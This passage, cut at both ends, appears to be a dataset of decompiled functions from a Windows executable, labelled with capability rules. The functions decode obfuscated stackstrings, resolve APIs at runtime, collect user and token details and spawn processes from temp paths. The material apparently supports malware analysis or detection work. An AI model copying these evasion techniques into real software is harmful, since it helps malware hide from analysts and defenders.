CONCAT11(var_50h._1_1_, 0x75);\n                var_48h = 0x65755350;\n                var_44h._0_1_ = 0x6f;\n                fcn.004034a8(extraout_ECX);\n                iVar13 = 0;\n                do {\n                    fcn.004034cf(iVar13, *(&var_48h + iVar13 % 5) ^ *(&var_5ch + iVar13));\n                    iVar13 = iVar13 + 1;\n                } while (iVar13 < 0xd);\n                var_3ch = fcn.0040179a();\n                pcVar15 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (var_3ch != 0) {\n                    var_5ch = 0x1c3a2734;\n                    var_58h = 0x1922033a;\n                    var_54h = 0x37102a1d;\n                    var_50h._0_2_ = CONCAT11(var_50h._1_1_, 0x48);\n                    var_48h = 0x68484e62;\n                    var_44h._0_1_ = 0x4f;\n                    fcn.004034f7(extraout_ECX_00);\n                    iVar13 = var_14h;\n                    var_30h = &var_5ch - var_14h;\n                    dwProcessId = 0;\n                    do {\n                        iVar12 = dwProcessId;\n                        pcVar1 = dwProcessId + iVar13;\n                        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        uVar2 = *(&var_48h + iVar12 % 5);\n                        uVar3 = pcVar1[var_30h];\n                        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        dwProcessId = dwProcessId + 1;\n                        *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n                    } while (dwProcessId < 0xd);\n                    (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 1, 0, 0, &TokenInformationLength);\n                    iVar12 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    pcVar15 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    if (iVar12 == 0x7a) {\n                        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, TokenInformationLength);\n                        puVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                        var_48h = puVar11;\n                        if (puVar11 != NULL) {\n                            iVar12 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                               (TokenHandle, 1, puVar11, TokenInformationLength, &TokenInformationLength\n                                               );\n                            if ((iVar12 != 0) &&\n                               (iVar12 = (*_sym.imp.ADVAPI32.dll_LookupAccountSidW)\n                                                   (0, *puVar11, var_10h, &var_38h, var_ch, &var_34h, &var_4ch), \n                               iVar12 != 0)) {\n                                var_74h = 0x45163626;\n                                var_70h = 0x5365751b;\n                                var_6ch = 0x363a480c;\n                                var_68h = 0x7572451d;\n                                var_64h = 0x4819536a;\n                                var_60h = 0x45203650;\n                                var_5ch = 0x53137514;\n                                var_58h = 0x36294836;\n                                var_54h = 0x752c4576;\n                                var_50h._0_2_ = 0x5336;\n                                var_2ch = 0x45533675;\n                                var_28h._0_1_ = 0x48;\n                                uVar8 = (*pcVar15)(8, 0x4d);\n                                iVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                                uVar14 = 0;\n                                do {\n                                    *(iVar13 + uVar14) = *(iVar13 + uVar14) * -5;\n                                    uVar14 = uVar14 + 1;\n                                } while (uVar14 < 0x4d);\n                                dwProcessId = iVar13;\n                                sub.ntdll.dll_memset(iVar13, 0, 0x4d);\n                                iVar12 = 0;\n                                var_30h = &var_74h - iVar13;\n                                do {\n                                    pcVar1 = iVar13 + iVar12;\n                                    cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                    uVar2 = *(&var_2ch + iVar12 % 5);\n                                    uVar3 = pcVar1[var_30h];\n                                    cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                    iVar5 = dwProcessId;\n                                    iVar12 = iVar12 + 1;\n                                    *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n                                    iVar13 = dwProcessId;\n                                } while (iVar12 < 0x26);\n                                (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, dwProcessId, var_ch, var_10h, var_3ch);\n                                iVar13 = var_14h;\n                                var_2ch = 1;\n                                uVar14 = 0;\n                                do {\n                                    pcVar1 = iVar5 + uVar14;\n                                    *pcVar1 = *pcVar1 + '~';\n                                    pcVar15 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                    uVar14 = uVar14 + 1;\n                                } while (uVar14 < 0x4d);\n                                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                                puVar11 = var_48h;\n                            }\n                            uVar8 = (*pcVar15)(0, puVar11);\n                            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                        }\n                    }\n                    uVar8 = (*pcVar15)(0, iVar13);\n                    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar8);\n                }\n                puVar11 = var_1ch;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n                uVar8 = (*pcVar15)(0, var_20h);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(ProcessHandle);\n            uVar8 = (*pcVar15)(0, puVar11);\n            (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar8);\n            puVar10 = var_ch;\n            puVar9 = var_10h;\n        }\n        uVar8 = (*pcVar15)(0, puVar10);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n        uVar8 = (*pcVar15)(0, puVar9);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n        uVar8 = var_2ch;\n    }\n    return uVar8;\n}\n",
        "token_count": 2857
    },
    "00401d3d": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * __fastcall fcn.00401d3d(uint param_1, uint param_2)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    uint uVar6;\n    uint *puVar7;\n    code *pcVar8;\n    int32_t iVar9;\n    uint extraout_ECX;\n    int32_t iVar10;\n    uchar *puVar11;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uchar *ARG_0;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t lpModuleName;\n    \n    var_54h = 0x62182704;\n    iVar10 = 8;\n    puVar7 = &var_2ch;\n    var_10h = param_2;\n    for (iVar9 = iVar10; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_50h = 0x27202021;\n    var_4ch = 0x2607411f;\n    puVar7 = &var_44h;\n    for (iVar9 = iVar10; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_48h = 0x321f272e;\n    ARG_0 = 0x326c4243;\n    puVar7 = &var_3ch;\n    for (iVar9 = iVar10; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_14h._0_2_ = 0x4f53;\n    puVar7 = &var_34h;\n    for (; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    puVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    lpModuleName = 0;\n    *puVar7 = 0;\n    puVar7[1] = 0;\n    puVar7[2] = 0;\n    puVar7[3] = 0;\n    *(puVar7 + 4) = 0;\n    var_8h = &var_54h - puVar7;\n    var_1ch = puVar7;\n    do {\n        iVar9 = lpModuleName;\n        pcVar1 = lpModuleName + puVar7;\n        cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&ARG_0 + iVar9 % 6);\n        uVar3 = pcVar1[var_8h];\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        lpModuleName = lpModuleName + 1;\n        *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n    } while (lpModuleName < 0x10);\n    var_54h = 0xb07363b;\n    var_50h = 0x47603c0a;\n    var_4ch = 0x3f3c0b4b;\n    var_48h = CONCAT31(var_48h._1_3_, 0x75);\n    ARG_0 = 0x65755350;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x6f);\n    fcn.004034a8(extraout_ECX);\n    iVar9 = 0;\n    do {\n        fcn.004034cf(iVar9, *(&ARG_0 + iVar9 % 5) ^ *(&var_54h + iVar9));\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0xd);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, puVar7);\n    pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar6);\n    if (pcVar8 != NULL) {\n        iVar9 = (*pcVar8)(var_ch, &var_2ch, &var_44h, &var_3ch, &var_34h);\n        pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (iVar9 != 0) {\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x104);\n            ARG_0 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n            var_54h = 0x471b1748;\n            var_50h = 0x5e155c5f;\n            puVar11 = ARG_0;\n            for (iVar9 = 0x104; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar11 = 0;\n                puVar11 = puVar11 + 1;\n            }\n            var_4ch = 0x1c575213;\n            var_48h = CONCAT31(var_48h._1_3_, 0x6d);\n            var_24h = 0x6236736d;\n            var_20h._0_2_ = 0x646f;\n            uVar6 = (*pcVar8)(8, 0xe);\n            puVar7 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar6);\n            var_8h = 0;\n            *puVar7 = 0;\n            puVar7[1] = 0;\n            puVar7[2] = 0;\n            *(puVar7 + 3) = 0;\n            var_ch = &var_54h - puVar7;\n            do {\n                iVar9 = var_8h;\n                pcVar1 = var_8h + puVar7;\n                cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar2 = *(&var_24h + iVar9 % 6);\n                uVar3 = pcVar1[var_ch];\n                cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                puVar11 = ARG_0;\n                var_8h = var_8h + 1;\n                *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n            } while (var_8h < 0xd);\n            (*_sym.imp.USER32.dll_wsprintfA)(ARG_0, puVar7, var_10h, var_28h, var_2ch);\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar7);\n            (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar6);\n            puVar7 = var_1ch;\n            goto code_r0x00401f4e;\n        }\n    }\n    puVar11 = NULL;\ncode_r0x00401f4e:\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpModuleName);\n    pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar7);\n    (*pcVar8)(uVar6);\n    return puVar11;\n}\n",
        "token_count": 1811
    },
    "00402026": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00402026(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    uint32_t uVar5;\n    char cVar6;\n    char cVar7;\n    uint uVar8;\n    uint *puVar9;\n    uint extraout_ECX;\n    int32_t iVar10;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t lpModuleName;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_2ch = 0x2c19112a;\n    var_28h = 0x3257003f;\n    var_24h = 0x532b2c3c;\n    var_20h._0_2_ = 0x1110;\n    var_20h._2_1_ = 0x4e;\n    var_1ch = 0x434e6263;\n    var_18h._0_2_ = 0x3648;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    puVar9 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar8);\n    lpModuleName = 0;\n    *puVar9 = 0;\n    puVar9[1] = 0;\n    puVar9[2] = 0;\n    puVar9[3] = 0;\n    var_10h = &var_2ch - puVar9;\n    do {\n        iVar10 = lpModuleName;\n        pcVar1 = lpModuleName + puVar9;\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_1ch + iVar10 % 6);\n        uVar3 = pcVar1[var_10h];\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        lpModuleName = lpModuleName + 1;\n        *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n    } while (lpModuleName < 0xf);\n    var_2ch = 0xb07363b;\n    var_28h = 0x47603c0a;\n    var_24h = 0x3f3c0b4b;\n    var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x75);\n    var_10h = 0x65755350;\n    var_ch._0_1_ = 0x6f;\n    fcn.004034a8(extraout_ECX);\n    iVar10 = 0;\n    do {\n        fcn.004034cf(iVar10, *(&var_10h + iVar10 % 5) ^ *(&var_2ch + iVar10));\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0xd);\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, puVar9);\n    *0x427fc8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar8);\n    if (*0x427fc8 != NULL) {\n        iVar10 = (**0x427fc8)(var_14h, &var_4h);\n        var_4h = -(iVar10 != 0) & var_4h;\n    }\n    uVar5 = var_4h;\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpModuleName);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    uVar8 = (*pcVar4)(0, puVar9);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar8);\n    return uVar5;\n}\n",
        "token_count": 927
    },
    "004022f2": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004022f2(uint *param_1)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    uint uVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint var_78h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t psz2;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uchar *psz1;\n    int32_t var_4h;\n    \n    var_ch = param_1;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    puVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    var_30h = 0x357e4654;\n    iVar9 = 0x44;\n    var_2ch = 0x5330747b;\n    for (iVar8 = 0x10; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *param_1 = 0;\n        param_1 = param_1 + 1;\n    }\n    var_28h = 0x460c5642;\n    var_24h = 0x742c352a;\n    puVar10 = &var_78h;\n    psz1 = puVar7;\n    for (; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    var_20h._0_2_ = 0x5346;\n    var_14h = 0x35534674;\n    for (iVar8 = 0x208; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_78h = 0x44;\n    var_10h._0_1_ = 0x56;\n    fcn.00403728(0);\n    iVar8 = 0;\n    var_4h = &var_30h - psz2;\n    do {\n        pcVar1 = psz2 + iVar8;\n        cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_14h + iVar8 % 5);\n        uVar3 = pcVar1[var_4h];\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        puVar7 = psz1;\n        iVar8 = iVar8 + 1;\n        *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n    } while (iVar8 < 0x12);\n    (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, *0x4279dc);\n    (*_sym.imp.SHLWAPI.dll_StrCatW)(puVar7, psz2);\n    puVar10 = var_ch;\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, puVar7, 0, 0, 0, 0x9000008, 0, 0, &var_78h, var_ch);\n    if (puVar10[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar10[1]);\n    }\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar7);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = *puVar10;\n    fcn.004036f7();\n    return uVar6;\n}\n",
        "token_count": 892
    },
    "00403b06": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00403b06(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    char cVar6;\n    char cVar7;\n    uint uVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint ARG_0;\n    int32_t lpNameBuffer;\n    uint nSize;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    lpNameBuffer = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n    nSize = 0x104;\n    var_8h = 0;\n    uVar8 = 0;\n    if (lpNameBuffer != 0) {\n        var_40h = 0x624a3528;\n        var_3ch = 0x35034911;\n        var_38h = 0x49366202;\n        var_34h = 0x6229355d;\n        var_30h = 0x351d4925;\n        var_2ch = 0x497e6202;\n        var_28h = 0x62423550;\n        var_24h = 0x35704937;\n        var_20h = 0x62673570;\n        var_1ch._0_2_ = 0x4944;\n        uVar8 = (*pcVar4)(8, 0x41);\n        iVar9 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar8);\n        uVar10 = 0;\n        do {\n            *(iVar9 + uVar10) = *(iVar9 + uVar10) * -0x7a;\n            uVar10 = uVar10 + 1;\n        } while (uVar10 < 0x41);\n        sub.ntdll.dll_memset(iVar9, 0, 0x41);\n        var_4h = 0;\n        var_ch = &var_40h - iVar9;\n        do {\n            iVar5 = var_4h;\n            pcVar1 = iVar9 + var_4h;\n            cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = *(&var_20h + iVar5 % 6);\n            uVar3 = pcVar1[var_ch];\n            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            iVar5 = lpNameBuffer;\n            var_4h = var_4h + 1;\n            *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n        } while (var_4h < 0x20);\n        cVar6 = (*_sym.imp.Secur32.dll_GetUserNameExW)(2, lpNameBuffer, &nSize);\n        if (cVar6 == '\\0') {\n            (*_sym.imp.KERNEL32.dll_GetLastError)();\n            fcn.00403ad4();\n        }\n        else {\n            (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar9, iVar5);\n            var_8h = 1;\n        }\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n        uVar10 = 0;\n        do {\n            *(iVar9 + uVar10) = *(iVar9 + uVar10) * 'v';\n            uVar10 = uVar10 + 1;\n        } while (uVar10 < 0x41);\n        uVar8 = (*pcVar4)(0, iVar9);\n        (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar8);\n        uVar8 = var_8h;\n    }\n    return uVar8;\n}\n",
        "token_count": 989
    },
    "00408689": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00408689(uint param_1, int32_t param_2)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    char cVar5;\n    char cVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    code *pcVar12;\n    uint *puVar13;\n    uint lpProcessAttributes;\n    uint var_50h;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t psz1;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_8h = param_2;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n    var_34h = iVar8;\n    uVar7 = (*pcVar12)(8, 0x208);\n    iVar9 = (*pcVar4)(uVar7);\n    if ((iVar8 != 0) && (iVar9 != 0)) {\n        psz1 = iVar9;\n        iVar10 = (*_sym.imp.KERNEL32.dll_GetTempPathW)(0x104, iVar9);\n        if (iVar10 != 0) {\n            iVar10 = (*_sym.imp.KERNEL32.dll_GetTempFileNameW)(iVar9, 0x41570c, 0, iVar8);\n            if (iVar10 != 0) {\n                iVar10 = fcn.00409d1f(var_8h);\n                if (iVar10 == 0) {\n                    fcn.004098e0();\n                    var_18h = 0x4d584745;\n                    var_14h = 0x4713511b;\n                    var_10h = 0x51454d1d;\n                    puVar13 = &lpProcessAttributes;\n                    for (iVar9 = 0x44; iVar9 != 0; iVar9 = iVar9 + -1) {\n                        *puVar13 = 0;\n                        puVar13 = puVar13 + 1;\n                    }\n                    lpProcessAttributes = 0x44;\n                    puVar13 = &var_50h;\n                    for (iVar9 = 0x10; iVar9 != 0; iVar9 = iVar9 + -1) {\n                        *puVar13 = 0;\n                        puVar13 = puVar13 + 1;\n                    }\n                    var_ch = 0x4d784713;\n                    var_8h = 0x4d784767;\n                    var_4h._0_2_ = 0x5136;\n                    fcn.004089a9(0);\n                    iVar9 = 0;\n                    var_28h = &var_18h - var_3ch;\n                    do {\n                        pcVar1 = var_3ch + iVar9;\n                        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        uVar2 = *(&var_8h + iVar9 % 6);\n                        uVar3 = pcVar1[var_28h];\n                        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        iVar9 = iVar9 + 1;\n                        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n                    } while (iVar9 < 0x10);\n                    var_24h = 0x494e5754;\n                    var_20h = 0x575b316b;\n                    var_1ch = 0x3123491c;\n                    var_18h = 0x4900571f;\n                    var_14h = 0x57023135;\n                    var_10h = 0x312a490f;\n                    var_ch = 0x496e571a;\n                    var_30h = 0x496e5776;\n                    var_2ch._0_2_ = 0x3146;\n                    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x39);\n                    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n                    uVar11 = 0;\n                    do {\n                        *(iVar8 + uVar11) = *(iVar8 + uVar11) + -0x2d;\n                        uVar11 = uVar11 + 1;\n                    } while (uVar11 < 0x39);\n                    sub.ntdll.dll_memset(iVar8, 0, 0x39);\n                    var_8h = 0;\n                    var_28h = &var_24h - iVar8;\n                    do {\n                        iVar9 = var_8h;\n                        pcVar1 = iVar8 + var_8h;\n                        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        uVar2 = *(&var_30h + iVar9 % 6);\n                        uVar3 = pcVar1[var_28h];\n                        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        iVar9 = psz1;\n                        var_8h = var_8h + 1;\n                        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n                    } while (var_8h < 0x1c);\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, 0x415714);\n                    pcVar4 = _sym.imp.SHLWAPI.dll_StrCatW;\n                    (*_sym.imp.SHLWAPI.dll_StrCatW)(iVar9, var_34h);\n                    (*pcVar4)(iVar9, iVar8);\n                    (*_sym.imp.KERNEL32.dll_CreateProcessW)\n                              (0, iVar9, 0, 0, 0, 0x9000008, 0, 0, &lpProcessAttributes, &var_50h);\n                    uVar11 = 0;\n                    do {\n                        *(iVar8 + uVar11) = *(iVar8 + uVar11) + -0x74;\n                        pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        uVar11 = uVar11 + 1;\n                    } while (uVar11 < 0x39);\n                    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n                    fcn.00408984();\n                    iVar8 = var_34h;\n                }\n            }\n        }\n        uVar7 = (*pcVar12)(0, iVar8);\n        pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n        uVar7 = (*pcVar12)(0, iVar9);\n        (*pcVar4)(uVar7);\n    }\n    return;\n}\n",
        "token_count": 1663
    },
    "004089eb": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004089eb(int32_t *arg_8h)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    code *pcVar5;\n    code *pcVar6;\n    char cVar7;\n    char cVar8;\n    int16_t *piVar9;\n    int16_t *piVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uint uVar13;\n    int16_t *in_ECX;\n    int16_t *piVar14;\n    char **in_EDX;\n    int16_t *piVar15;\n    int16_t *piVar16;\n    uint uVar17;\n    int16_t *piVar18;\n    char *pcVar19;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    int32_t var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_10fh;\n    uint var_10bh;\n    uint var_107h;\n    uint var_103h;\n    uint var_ffh;\n    uint var_fbh;\n    uint var_f7h;\n    uint var_f3h;\n    uint var_efh;\n    uint var_ebh;\n    uint var_e7h;\n    uint var_e3h;\n    uint var_dfh;\n    uint var_dbh;\n    uint var_d7h;\n    uint var_d3h;\n    uint var_cfh;\n    uint var_cbh;\n    uint var_c7h;\n    uint var_c3h;\n    uint var_bfh;\n    uint var_bbh;\n    uint var_b7h;\n    uint var_b3h;\n    uint var_afh;\n    uint var_abh;\n    uint var_a7h;\n    uint var_a3h;\n    uint var_9fh;\n    uint var_9bh;\n    uint var_97h;\n    uint var_93h;\n    uint var_8fh;\n    uint var_8bh;\n    uint var_87h;\n    uint var_83h;\n    uint var_7fh;\n    uint var_7bh;\n    uint var_77h;\n    uint var_73h;\n    uint var_6fh;\n    uint var_6bh;\n    uint var_67h;\n    uint var_63h;\n    uint var_5fh;\n    uint var_5bh;\n    uint var_57h;\n    uint var_53h;\n    uint var_4fh;\n    uint var_4bh;\n    uint var_47h;\n    uint var_43h;\n    uint var_3fh;\n    uint var_3bh;\n    uint var_37h;\n    uint var_33h;\n    uint var_2fh;\n    uint var_2bh;\n    uint var_27h;\n    uint var_23h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_17h;\n    uint var_ch;\n    uint var_8h;\n    int16_t *lpWideCharStr;\n    \n    uVar17 = 0;\n    piVar9 = fcn.004109a8();\n    if (piVar9 != NULL) {\n        var_150h = 0x330c591a;\n        var_14ch = 0x59336a2f;\n        var_148h = 0x6a233329;\n        var_144h = 0x3334592e;\n        var_140h = 0x594c6a17;\n        var_13ch = 0x6a393350;\n        var_138h = 0x333d5928;\n        var_134h = 0x59206a24;\n        var_130h = 0x6a3f332e;\n        var_12ch = 0x333f5933;\n        var_128h = 0x597c6a6a;\n        var_124h = 0x6a68337a;\n        var_120h = 0x33195965;\n        var_11ch = 0x59086a02;\n        var_118h = 0x6a0b3319;\n        var_114h._0_1_ = 6;\n        stack0xfffffee9 = 0x6e331559;\n        var_10fh = 0x5759636a;\n        var_10bh = 0x6a4033;\n        var_107h = 0x3c333e59;\n        var_103h = 0x3459206a;\n        var_ffh = 0x246a2933;\n        var_fbh = 0x3333e59;\n        var_f7h = 0x1c590f6a;\n        var_f3h = 